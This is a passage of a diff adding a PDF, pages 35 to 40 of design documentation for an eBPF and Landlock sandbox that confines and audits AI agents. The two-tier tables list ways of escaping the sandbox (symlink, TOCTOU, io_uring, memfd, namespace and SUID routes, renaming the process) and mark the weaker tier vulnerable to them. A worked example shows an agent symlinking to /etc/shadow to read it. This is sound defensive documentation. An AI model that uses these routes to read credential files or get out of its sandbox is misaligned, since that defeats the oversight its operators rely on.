+(When an operator edits policy through the dashboard and clicks "Save":) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 303 Tm
+(BEFORE fix:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 291 Tm
+(  1. Dashboard saves updated policy to config.toml ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 279 Tm
+(  2. BPF maps still contain OLD policy ? PROBLEM) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 267 Tm
+(  3. eBPF program enforces OLD rules) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 255 Tm
+(  4. New policy only takes effect after daemon restart or SIGHUP) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 231 Tm
+(  During this gap, the operator thinks the new policy is active,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 219 Tm
+(  but the old policy is actually being enforced!) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 199 Tm
+(17.2 Immediate Map Reload on Save) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 176 Tm
+(AFTER fix:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 164 Tm
+(  1. Dashboard saves updated policy to config.toml ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 152 Tm
+(  2. Trigger BPF map sync \(same logic as SIGHUP reload\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 140 Tm
+(  3. Clear old entries from DENY_EXACT, ALLOW_EXACT, etc.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 128 Tm
+(  4. Insert new entries from updated config) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 116 Tm
+(  5. eBPF program immediately enforces NEW rules ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 92 Tm
+(  No gap between save and enforcement.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 35 of 40) Tj
+ET
+endstream
+endobj
+39 0 obj
+<< /Length 3215 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 718 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 700 Tm
+(18. SIGHUP Config Reload) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 672 Tm
+(18.1 What Is SIGHUP?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 649 Tm
+(SIGHUP \(Signal Hang Up\) is a Unix signal traditionally sent to a daemon to tell it to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 634 Tm
+(reload its configuration. You send it with:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 609 Tm
+(sudo kill -SIGHUP $\(pidof guardian\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 597 Tm
+(# or) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 585 Tm
+(sudo kill -1 $\(pidof guardian\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 565 Tm
+(18.2 What Gets Reloaded) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 542 Tm
+(SIGHUP received:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 530 Tm
+(  ?? Re-read config.toml from disk                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 518 Tm
+(  ?? Update agent file access policies ? BPF maps     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 506 Tm
+(  ?? Update agent exec policies ? BPF maps            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 494 Tm
+(  ?? Update agent network policies ? BPF maps         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 482 Tm
+(  ?? Update permissions config \(rate limits, etc.\)     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 470 Tm
+(  ?? Rebuild alert outputs \(webhooks, Slack, email\)    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 458 Tm
+(  ?? Log summary of changes                           ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 438 Tm
+(This allows configuration changes without restarting the daemon or interrupting) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 423 Tm
+(monitored agents.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 392 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 374 Tm
+(19. BTF-Based Portable Tracepoint Offsets) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 346 Tm
+(19.1 The Hardcoded Offset Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 323 Tm
+(When Guardian reads syscall arguments from tracepoints, it uses hardcoded byte offsets:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 298 Tm
+(// x86_64 specific offsets!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 286 Tm
+(let filename_ptr: u64 = unsafe { ctx.read_at\(24\)? };  // offset 24) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 274 Tm
+(let flags: i32 = unsafe { ctx.read_at\(32\)? };          // offset 32) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 254 Tm
+(These offsets come from the kernel's tracepoint format definition for x86_64. On aarch64) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 239 Tm
+(\(ARM\), the offsets are different because the syscall ABI passes arguments in different) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 224 Tm
+(registers:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 199 Tm
+(x86_64:  filename at offset 24, flags at offset 32) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 187 Tm
+(aarch64: filename at offset ??,  flags at offset ??) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 167 Tm
+(If you run Guardian's eBPF program on aarch64 without changing the offsets, it reads) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 152 Tm
+(garbage data from the wrong memory locations.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 127 Tm
+(19.2 What Is BTF?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 104 Tm
+(BTF \(BPF Type Format\) is a compact metadata format embedded in the kernel binary \(since) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 36 of 40) Tj
+ET
+endstream
+endobj
+40 0 obj
+<< /Length 3476 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(Linux 5.2\). It describes the types and structures used by the kernel, including) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(tracepoint argument layouts.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 692 Tm
+(Think of it as a blueprint that tells eBPF programs exactly where each field is located) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 677 Tm
+(in memory, regardless of architecture or kernel version.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 652 Tm
+(Without BTF:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 640 Tm
+(  Developer must manually look up offsets:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 628 Tm
+(    $ cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_openat/format) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 616 Tm
+(    field:const char * filename;  offset:24;  size:8;  signed:0;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 604 Tm
+(  And hardcode them into the eBPF program for each architecture.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 580 Tm
+(With BTF:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 568 Tm
+(  eBPF program says "give me the 'filename' field") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 556 Tm
+(  BTF resolves to the correct offset automatically) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 544 Tm
+(  Works on x86_64, aarch64, and any other architecture) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 524 Tm
+(19.3 How BTF Makes eBPF Portable) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 501 Tm
+(// BEFORE \(hardcoded, x86_64 only\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 489 Tm
+(let filename_ptr: u64 = unsafe { ctx.read_at\(24\)? };) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 465 Tm
+(// AFTER \(BTF-portable\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 453 Tm
+(#[repr\(C\)]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 441 Tm
+(struct SysEnterOpenatArgs {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 429 Tm
+(    _common: [u8; 8],) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 417 Tm
+(    __syscall_nr: i32,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 405 Tm
+(    dfd: i64,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 393 Tm
+(    filename: u64,    // BTF tells the compiler the correct offset) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 381 Tm
+(    flags: i64,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 369 Tm
+(    mode: i64,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 357 Tm
+(}) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 333 Tm
+(let args: &SysEnterOpenatArgs = unsafe { ctx.read_at\(0\)? };) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 321 Tm
+(let filename_ptr = args.filename;  // Correct offset on any architecture) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 295 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 277 Tm
+(20. The Two Security Tiers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 249 Tm
+(Guardian provides two levels of protection depending on how the agent is launched:) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 224 Tm
+(Tier 1: Cgroup Agents \(Hardened ? 4 layers\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 201 Tm
+(Launched with: guardian-launch --name agent -- command) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 176 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 164 Tm
+(?              Cgroup Agent \(Tier 1\)            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 152 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 140 Tm
+(?  Landlock    ? Inode-level, symlink-immune   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 128 Tm
+(?  Seccomp     ? io_uring, memfd, mount blocked?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 116 Tm
+(?  eBPF LSM    ? file_open, bprm_check, etc.   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 104 Tm
+(?  Cgroup      ? Resource limits, identity      ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 92 Tm
+(?  No New Privs? SUID escalation blocked       ?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 37 of 40) Tj
+ET
+endstream
+endobj
+41 0 obj
+<< /Length 4045 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(?  Symlink bypass:     IMMUNE \(Landlock\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(?  TOCTOU race:        IMMUNE \(Landlock\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(?  io_uring bypass:    BLOCKED \(seccomp\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(?  memfd execution:    BLOCKED \(seccomp\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(?  Mount escape:       BLOCKED \(seccomp\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(?  Namespace escape:   BLOCKED \(seccomp\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(?  SUID escalation:    BLOCKED \(no_new_privs\)  ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(?  Rename/hardlink:    BLOCKED \(inode LSM\)     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(?  Resource exhaustion:BLOCKED \(cgroup limits\) ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(?  Identity spoofing:  IMPOSSIBLE \(cgroup ID\)  ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 580 Tm
+(Tier 2: Comm-Based Agents \(Limited ? 1 layer\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 557 Tm
+(Configured in config.toml by process name:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 532 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 520 Tm
+(?           Comm-Based Agent \(Tier 2\)          ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 508 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 496 Tm
+(?  eBPF only  ? Tracepoint + LSM monitoring    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 484 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 472 Tm
+(?  Symlink bypass:     VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 460 Tm
+(?  TOCTOU race:        VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 448 Tm
+(?  io_uring bypass:    VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 436 Tm
+(?  memfd execution:    VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 424 Tm
+(?  Mount escape:       VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 412 Tm
+(?  Namespace escape:   VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 400 Tm
+(?  SUID escalation:    VULNERABLE             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 388 Tm
+(?  Rename/hardlink:    Partially blocked \(LSM\)?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 376 Tm
+(?  Resource exhaustion:NO LIMITS              ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 364 Tm
+(?  Identity spoofing:  POSSIBLE \(rename comm\) ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 352 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(Recommendation: Always use cgroup agents \(Tier 1\) in production. Comm-based agents exist) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 317 Tm
+(for backward compatibility and quick testing only.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 286 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 268 Tm
+(21. Summary: All Layers Working Together) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 240 Tm
+(Here is a complete trace of what happens when a cgroup agent tries to access a denied) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 225 Tm
+(file through a symlink:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 200 Tm
+(Agent: ln -s /etc/shadow /tmp/trick && cat /tmp/trick) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 176 Tm
+(Step 1: LANDLOCK CHECK \(inode level\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 164 Tm
+(  Kernel resolves /tmp/trick ? symlink ? /etc/shadow ? inode #12345) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 152 Tm
+(  Landlock: is inode #12345 in the allow set?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 140 Tm
+(    - inode\(/tmp\) is allowed, but /etc/shadow's inode is NOT under /tmp) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 128 Tm
+(    - /etc/shadow's inode is under /etc, which is NOT in the allow set) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 116 Tm
+(  Result: -EACCES ? BLOCKED AT FIRST LAYER) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 92 Tm
+(  \(If Landlock were somehow bypassed, the next layers would catch it:\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 38 of 40) Tj
+ET
+endstream
+endobj
+42 0 obj
+<< /Length 3872 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(Step 2: eBPF TRACEPOINT \(sys_enter_openat\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  Reads raw path: "/tmp/trick") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  Is process in WATCHED_CGROUPS? YES \(cgroup ID match\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  Normalize path: "/tmp/trick" \(no proc/.. to strip\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  Evaluate policy: /tmp/** is allowed) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(  ? Does NOT set PENDING_DENY \(raw path looks allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(  ? Sends event to userspace for logging) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(Step 3: eBPF LSM \(file_open\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(  Checks PENDING_DENY: not set ? allows) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(  \(Landlock already blocked it, so this hook never fires\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(Step 4: USERSPACE PROCESSING) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(  Daemon receives event: agent tried to access /tmp/trick) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(  Dashboard shows the access attempt in real-time events) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 540 Tm
+(  Alert sent if configured) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 516 Tm
+(Step 5: SECCOMP \(not triggered for normal file open\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(  Would block io_uring if agent tried that instead) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(Final result: Agent gets "Permission denied" from Landlock) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(              Human operator sees the attempt in the dashboard) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 456 Tm
+(              Audit trail records the event in SQLite) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 436 Tm
+(This is defense-in-depth in action: Landlock stopped the attack at the first layer, but) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 421 Tm
+(even if it had failed, the eBPF LSM and seccomp layers would have provided additional) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 406 Tm
+(protection. And regardless of whether the access was blocked or allowed, the audit trail) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(captures everything for forensic analysis.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 360 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 342 Tm
+(Appendix A: Kernel Feature Requirements) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 314 Tm
+(| Feature | Minimum Kernel | Config Flag | Purpose |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 299 Tm
+(|---------|---------------|-------------|---------| | eBPF | 4.15 | CONFIG_BPF=y | All) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 284 Tm
+(monitoring | | Tracepoints | 4.15 | CONFIG_FTRACE=y | Syscall hooks | | PerfEventArray |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 269 Tm
+(5.2 | CONFIG_BPF=y | Event streaming | | BPF LSM | 5.7 | CONFIG_BPF_LSM=y | Enforcement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 254 Tm
+(| | bpf_d_path\(\) | 5.11 | CONFIG_BPF_LSM=y | Symlink resolution | | Landlock | 5.13 |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 239 Tm
+(CONFIG_SECURITY_LANDLOCK=y | Inode sandbox | | Landlock TCP | 6.7 |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 224 Tm
+(CONFIG_SECURITY_LANDLOCK=y | Network sandbox | | openat2 | 5.6 | ? | Modern file open |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 209 Tm
+(| cgroup v2 | 4.5 | CONFIG_CGROUPS=y | Agent isolation | | Seccomp | 3.17 |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 194 Tm
+(CONFIG_SECCOMP=y | Syscall blocking | | BTF | 5.2 | CONFIG_DEBUG_INFO_BTF=y | Portable) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 179 Tm
+(offsets |) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 154 Tm
+(Appendix B: Error Codes Used by Guardian) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 126 Tm
+(| Error Code | Name | Returned By | Meaning |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 111 Tm
+(|-----------|------|------------|---------| | -13 | EACCES | file_open, inode_rename,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 96 Tm
+(inode_unlink, inode_link | Permission denied \(file access\) | | -1 | EPERM |) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 39 of 40) Tj
+ET
+endstream
+endobj
+43 0 obj
+<< /Length 3105 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(bprm_check_security | Operation not permitted \(exec blocked\) | | -111 | ECONNREFUSED |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(socket_connect | Connection refused \(network blocked\) |) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 692 Tm
+(Appendix C: Glossary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 664 Tm
+(| Term | Definition | |------|-----------| | eBPF | Extended Berkeley Packet Filter ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 649 Tm
+(safe kernel-space programmability | | LSM | Linux Security Module ? kernel hook) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 634 Tm
+(framework for access control | | BPF Map | Shared data structure between kernel eBPF) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 619 Tm
+(programs and userspace | | Tracepoint | Pre-defined kernel instrumentation point at) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 604 Tm
+(syscall boundaries | | Landlock | Self-imposed inode-level filesystem sandbox \(Linux) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 589 Tm
+(5.13+\) | | Seccomp | Syscall filtering via BPF programs | | Cgroup | Control Group ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 574 Tm
+(kernel mechanism for process grouping and resource limits | | Inode | Index Node ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 559 Tm
+(unique identifier for a file on disk \(independent of path/name\) | | Dentry | Directory) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(Entry ? kernel cache entry mapping names to inodes | | VFS | Virtual File System ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 529 Tm
+(kernel abstraction layer for filesystem access | | TOCTOU | Time-of-Check-to-Time-of-Use) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 514 Tm
+(? race condition attack | | Symlink | Symbolic Link ? a file that points to another file) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 499 Tm
+(by path name | | Hardlink | A second directory entry pointing to the same inode | | SUID) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 484 Tm
+(| Set User ID ? binary that runs with the file owner's privileges | |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 469 Tm
+(PR_SET_NO_NEW_PRIVS | Process flag preventing privilege escalation via exec | |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 454 Tm
+(PerfEventArray | BPF map type for streaming events to userspace | | LpmTrie | Longest) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 439 Tm
+(Prefix Match Trie ? BPF map for prefix matching \(like /tmp/\) | | PerCpuArray | BPF map) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 424 Tm
+(with one copy per CPU core \(no locking needed\) | | Oneshot Channel | Rust async) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 409 Tm
+(primitive that sends exactly one message | | BTF | BPF Type Format ? kernel type) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 394 Tm
+(metadata for portable eBPF programs | | SIGHUP** | Signal Hang Up ? Unix signal used to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 379 Tm
+(reload daemon configuration |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 348 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(*Generated for Guardian Shell Phase 10 ? March 2026* *This document covers all security) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 315 Tm
+(mechanisms implemented through Phase 10 \(Hardened Cgroup Agents\)*) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 40 of 40) Tj
+ET
+endstream
+endobj
+44 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 4 0 R >>
+endobj
+45 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 5 0 R >>
+endobj
+46 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 6 0 R >>
+endobj
+47 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 7 0 R >>
+endobj
+48 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 8 0 R >>
+endobj
+49 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 9 0 R >>
+endobj
+50 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 10 0 R >>
+endobj
+51 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 11 0 R >>
+endobj
+52 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 12 0 R >>
+endobj
+53 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 13 0 R >>
+endobj
+54 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 14 0 R >>
+endobj
+55 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 15 0 R >>
+endobj
+56 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 16 0 R >>
+endobj
